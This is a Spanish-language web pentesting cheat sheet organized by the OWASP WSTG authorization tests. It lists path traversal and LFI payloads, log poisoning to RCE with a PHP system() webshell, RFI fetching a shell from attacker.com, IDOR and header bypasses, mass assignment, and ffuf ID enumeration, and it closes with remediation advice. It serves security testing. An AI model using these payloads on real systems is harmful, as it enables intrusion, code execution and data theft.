# 4.5 Authorization Testing (WSTG-ATHZ)

## WSTG-ATHZ-01: Testing Directory Traversal File Include

### Path Traversal
```bash
# Payloads básicos
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..%252f..%252f..%252fetc%252fpasswd  # doble URL encode
%252e%252e%252f                       # doble encode
/var/www/../../etc/passwd             # path normalización

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
%252e%252e%255c

# Objetivo → archivos de interés
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/version
/etc/nginx/nginx.conf
/var/log/apache2/access.log  # log poisoning
C:\Windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
```

### LFI (Local File Inclusion)
```bash
# Parámetros vulnerables típicos: page, include, file, template, lang
https://target.com/?page=../../../etc/passwd
https://target.com/?file=php://filter/convert.base64-encode/resource=/etc/passwd
https://target.com/?page=php://input  # + cuerpo POST con código PHP
https://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# Log Poisoning → RCE
# 1. Poisonar log con PHP en User-Agent:
curl https://target.com -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# 2. Incluir el log:
curl "https://target.com/?page=/var/log/apache2/access.log&cmd=id"

# Null byte bypass (PHP < 5.3.4)
https://target.com/?page=../../../etc/passwd%00
```

### RFI (Remote File Inclusion)
```bash
# Alojar webshell en servidor propio:
# shell.txt: <?php system($_GET['cmd']); ?>

https://target.com/?page=http://attacker.com/shell.txt
https://target.com/?page=http://attacker.com/shell.txt%00
https://target.com/?page=ftp://attacker.com/shell.txt

# Verificar si allow_url_include = On en PHP
```

---

## WSTG-ATHZ-02: Testing for Bypassing Authorization Schema

### Técnicas IDOR y Bypass
```bash
# Manipulación de parámetros de usuario
GET /api/users/1234/profile → cambiar a /api/users/1235/profile
GET /invoices?user_id=me → cambiar a user_id=1, 2, 3...
GET /documents/download?file_id=100 → 101, 102...

# Manipular método HTTP
GET /admin → 302 Found
HEAD /admin → 200 OK (bypass)
POST /admin → 200 OK

# Manipular headers para bypass
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: admin.internal
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-For: 127.0.0.1

# Path fuzzing con sufijos
/admin.json
/admin/..
/admin/../admin
%2fadmin
/./admin
/admin/*
/admin%20
/admin/.
;/admin
```

### Otros Vectores de Bypass
- Forced browsing directo a endpoints de API que el frontend oculta pero no protege en el servidor
- Cambiar la extensión del recurso solicitado (`/admin.php` → `/admin.json` → `/admin/`)
- Probar versiones antiguas de la API que puedan no tener el mismo middleware de autorización (`/api/v1/admin` vs `/api/v2/admin`)

---

## WSTG-ATHZ-03: Testing for Privilege Escalation

### Vertical (user → admin)
```bash
# Cambiar role/privilege en parámetros, JSON body, cookies
POST /api/profile HTTP/1.1
{"name":"test","role":"admin"}  # intentar agregar role

# Acceder a endpoints de admin como usuario normal
GET /api/admin/users
DELETE /api/admin/users/1

# Forzar parámetros de privilegio
POST /login -d "username=user&password=pass&admin=true"

# Mass assignment: enviar campos extra que el backend no debería aceptar
PATCH /api/users/me {"isAdmin":true,"role":"superadmin","verified":true}
```

### Horizontal (user A → user B)
```bash
# IDOR: acceder a recursos de otro usuario
GET /api/orders/5678  # siendo el usuario que creó la orden 1234
POST /api/users/5678/delete  # eliminar cuenta de otro usuario

# Probar también operaciones de escritura, no solo lectura:
PUT /api/users/5678/email -d "email=attacker@evil.com"
```

### Metodología General
1. Crear dos cuentas con el mismo rol bajo (A y B)
2. Crear una cuenta con rol superior (C, si es posible)
3. Mapear todos los endpoints accesibles por C
4. Intentar acceder a esos mismos endpoints con A
5. Mapear recursos propios de B
6. Intentar acceder/modificar esos recursos desde A

---

## WSTG-ATHZ-04: Testing for Insecure Direct Object References (IDOR)

### Metodología
1. Identificar todos los parámetros que referencian objetos (IDs, nombres, rutas, tokens)
2. Crear dos cuentas A y B
3. Con la cuenta A, acceder al recurso de B usando el ID de B
4. Si funciona → IDOR confirmado
5. Repetir para operaciones de lectura (GET) y escritura (POST/PUT/DELETE)

### Tipos de Referencias
- **Numérico secuencial**: `?id=1`, `?order_id=1001`
- **GUID/UUID**: `?token=550e8400-e29b-41d4-a716-446655440000` (¿es realmente impredecible?)
- **Hash**: `?file=d41d8cd98f00b204e9800998ecf8427e` (¿MD5 de algo predecible, como el username?)
- **Nombre de archivo**: `?file=user_report.pdf` → `?file=../admin_report.pdf`

```bash
# Con ffuf para IDOR numérico (autenticado como usuario B, probando IDs de otros):
ffuf -u "https://target.com/api/orders/FUZZ" \
  -H "Authorization: Bearer <token_usuario_B>" \
  -w <(seq 1 10000) \
  -mc 200

# Comparar respuestas para detectar acceso exitoso vs denegado
ffuf -u "https://target.com/api/orders/FUZZ" \
  -H "Authorization: Bearer <token>" \
  -w <(seq 1 1000) \
  -fc 403,404
```

### Remediación General (ATHZ)
- Verificación de autorización en cada request del lado del servidor, nunca confiar en el cliente
- Usar identificadores no predecibles (UUID v4) para recursos sensibles, combinados con verificación de propiedad
- Middleware de autorización centralizado aplicado a TODAS las rutas, incluidas las nuevas/legacy
- Negar por defecto (deny by default) y solo permitir explícitamente
